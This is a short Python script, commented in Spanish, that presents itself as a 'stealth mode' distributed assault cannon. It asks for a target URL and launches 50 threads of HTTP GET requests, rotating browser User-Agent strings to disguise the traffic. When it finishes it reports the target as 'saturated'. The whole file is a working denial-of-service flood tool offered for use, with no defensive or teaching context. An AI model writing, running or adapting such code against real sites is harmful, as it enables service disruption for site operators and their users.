import threading
import requests
import random
import os
import time
from colorama import Fore, Style, init

init()

# Lista de identidades para el Modo Sigilo
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (PlayStation 5 7.61) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
]

def banner():
    os.system('clear')
    print(f"{Fore.RED}{Style.BRIGHT}")
    print("##############################################")
    print("#      CAÑÓN ELISANDRO V2 - MODO SIGILO      #")
    print("#       SISTEMA DE ASALTO DISTRIBUIDO        #")
    print("##############################################")
    print(f"{Style.RESET_ALL}")

def ataque_sigilo(url, peticiones, worker_id):
    for _ in range(peticiones // 50):
        try:
            # Seleccionamos una identidad aleatoria para cada disparo
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            r = requests.get(url, headers=headers, timeout=5)
            print(f"{Fore.MAGENTA}[SIGILO-{worker_id}]{Fore.WHITE} Impacto exitoso -> {r.status_code}")
        except:
            pass

if __name__ == "__main__":
    banner()
    print(f"{Fore.CYAN}>> INGRESA LA URL OBJETIVO (A PARCHAR):{Style.RESET_ALL}")
    target = input("URL: ")
    
    if not target.startswith("http"):
        print(f"{Fore.RED}[!] Error: La URL debe incluir http:// o https://")
        exit()

    print(f"\n{Fore.GREEN}[⚡] MODO SIGILO ACTIVADO. LANZANDO 1500 PETICIONES...")
    
    threads = []
    for i in range(50):
        t = threading.Thread(target=ataque_sigilo, args=(target, 1500, i))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(f"\n{Fore.RED}[+] ATAQUE FINALIZADO. OBJETIVO SATURADO.{Style.RESET_ALL}")
